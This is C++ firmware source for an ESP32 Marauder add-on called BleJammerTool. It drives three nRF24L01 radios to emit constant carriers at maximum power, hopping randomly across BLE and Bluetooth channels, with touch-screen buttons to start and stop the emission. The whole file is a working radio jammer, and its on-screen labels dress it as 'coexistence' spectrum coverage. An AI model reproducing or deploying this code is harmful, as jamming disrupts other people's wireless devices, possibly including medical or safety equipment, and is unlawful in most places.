#include <SPI.h>
#include <RF24.h>

// Prima le configurazioni globali
#include "configs.h"

// Marauder istanzia lo schermo come oggetto globale chiamato "display" (minuscolo)
#ifdef HAS_DISPLAY
  #include "Display.h"
  extern Display display; 
#endif

#include "BleJammer.h"

namespace BleJammerTool {

// Definizione della piedinatura SPI per i moduli nRF24L01 su AWOK
#define CE_PIN_1  12
#define CSN_PIN_1 13
#define CE_PIN_2  14
#define CSN_PIN_2 27
#define CE_PIN_3  32
#define CSN_PIN_3 33

RF24 radio1(CE_PIN_1, CSN_PIN_1, 16000000);
RF24 radio2(CE_PIN_2, CSN_PIN_2, 16000000);
RF24 radio3(CE_PIN_3, CSN_PIN_3, 16000000);

enum OperationMode { BLE_PROFILE, BLUETOOTH_PROFILE };
OperationMode currentMode = BLE_PROFILE;

bool jammerActive = false;

// Canali RF per lo spettro di frequenze (2400 + Canale MHz)
const byte ble_channels[] = {2, 26, 80};
const byte bluetooth_channels[] = {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};

// Sotto-gruppi per l'emissione costante parallela iniziale
const byte group1[] = {2, 5, 8, 11};
const byte group2[] = {26, 29, 32, 35};
const byte group3[] = {80, 83, 86, 89};

// Configurazione iniziale dei registri RF hardware
void configureRadioCarrier(RF24 &radio, const byte* channels, size_t size) {
  if (!radio.begin()) return;
  
  radio.setAutoAck(false);
  radio.stopListening();
  radio.setRetries(0, 0);
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);

  if (size > 0) {
    radio.setChannel(channels[0]);
    radio.startConstCarrier(RF24_PA_MAX, channels[0]);
  }
}

// Aggiorna lo stato di alimentazione o trasmissione dei transceiver
void updateRadioState() {
  if (jammerActive) {
    configureRadioCarrier(radio1, group1, sizeof(group1));
    configureRadioCarrier(radio2, group2, sizeof(group2));
    configureRadioCarrier(radio3, group3, sizeof(group3));
  } else {
    radio1.powerDown();
    radio2.powerDown();
    radio3.powerDown();
  }
}

// Funzione di aggiornamento dell'area log testuale sullo schermo
void drawInterfaceStatus(String currentLog) {
#ifdef HAS_DISPLAY
  // Pulisce solo l'area di testo interna per evitare sfarfallii dell'intera UI
  display.tft.fillRect(10, 60, 220, 120, TFT_BLACK);
  
  display.tft.setTextColor(TFT_GREEN);
  display.tft.setTextSize(1);
  display.tft.setCursor(15, 70);
  display.tft.print("Spettro: " + String(currentMode == BLE_PROFILE ? "BLE (Coexistence)" : "Bluetooth Legacy"));
  
  display.tft.setCursor(15, 90);
  display.tft.print("Stato RF: " + String(jammerActive ? "ATTIVO (Hopping)" : "DISATTIVATO"));
  
  display.tft.setCursor(15, 120);
  display.tft.setTextColor(TFT_YELLOW);
  display.tft.print("Log: " + currentLog);
#endif
}

// Disegna l'interfaccia grafica completa sul display TFT di Marauder
void drawFullInterface() {
#ifdef HAS_DISPLAY
  display.clearScreen(); 
  
  // Barra del titolo superiore (Stile Marauder)
  display.tft.fillRect(0, 0, 240, 40, TFT_NAVY);
  display.tft.setTextColor(TFT_WHITE);
  display.tft.setTextSize(2);
  display.tft.setCursor(10, 12);
  display.tft.print("nRF24 COEXISTENCE");

  // Riquadro per l'output di stato
  display.tft.drawRect(5, 50, 230, 140, TFT_DARKGREY);
  drawInterfaceStatus("Hardware Pronto");

  // Pulsante Touch 1: START / STOP
  display.tft.fillRect(10, 200, 105, 45, jammerActive ? TFT_RED : TFT_GREEN);
  display.tft.setCursor(20, 215);
  display.tft.setTextColor(TFT_WHITE);
  display.tft.setTextSize(1);
  display.tft.print(jammerActive ? "STOP EMISSION" : "START EMISSION");

  // Pulsante Touch 2: MODALITÀ
  display.tft.fillRect(125, 200, 105, 45, TFT_BLUE);
  display.tft.setCursor(140, 215);
  display.tft.print(currentMode == BLE_PROFILE ? "MODE: BLE" : "MODE: BT");

  // Pulsante Touch 3: ESCI
  display.tft.fillRect(10, 255, 220, 45, TFT_RED);
  display.tft.setCursor(95, 270);
  display.tft.print("ESCI AL MENU");
#endif
}

// Funzione principale che contiene il ciclo vitale del tool
void runModuleLoop() {
  jammerActive = false;
  currentMode = BLE_PROFILE;
  updateRadioState();
  drawFullInterface();
  
  bool isRunning = true;
  uint16_t touchX = 0, touchY = 0;

  while (isRunning) {
    // Logica di hopping se l'emissione è attiva
    if (jammerActive) {
      byte activeChannel = 0;
      if (currentMode == BLE_PROFILE) {
        int index = random(0, sizeof(ble_channels));
        activeChannel = ble_channels[index];
      } else {
        int index = random(0, sizeof(bluetooth_channels));
        activeChannel = bluetooth_channels[index];
      }

      // Cambia frequenza istantaneamente per coprire lo spettro selezionato
      radio1.setChannel(activeChannel);
      radio1.startConstCarrier(RF24_PA_MAX, activeChannel);
      
      radio2.setChannel(activeChannel);
      radio2.startConstCarrier(RF24_PA_MAX, activeChannel);
      
      delayMicroseconds(40); 
    }

#ifdef HAS_DISPLAY
    // Lettura delle coordinate del touch screen
    if (display.tft.getTouch(&touchX, &touchY)) {
      
      // Logica Pulsante 1: START / STOP
      if ((touchX > 10 && touchX < 115) && (touchY > 200 && touchY < 245)) {
        jammerActive = !jammerActive;
        updateRadioState();
        drawFullInterface();
        drawInterfaceStatus(jammerActive ? "Generazione Portante..." : "Emissione Bloccata.");
        delay(350); 
      }

      // Logica Pulsante 2: CAMBIO MODALITÀ Spettro
      if ((touchX > 125 && touchX < 230) && (touchY > 200 && touchY < 245)) {
        currentMode = (currentMode == BLE_PROFILE) ? BLUETOOTH_PROFILE : BLE_PROFILE;
        updateRadioState();
        drawFullInterface();
        drawInterfaceStatus("Profilo Spettro Modificato");
        delay(350);
      }

      // Logica Pulsante 3: ESCI E TORNA A MARAUDER
      if ((touchX > 10 && touchX < 230) && (touchY > 255 && touchY < 300)) {
        isRunning = false;
      }
    }
#endif
    
    yield(); 
  }

  // Misure di sicurezza all'uscita del tool
  jammerActive = false;
  updateRadioState();
#ifdef HAS_DISPLAY
  display.clearScreen();
#endif
}

} // namespace BleJammerTool
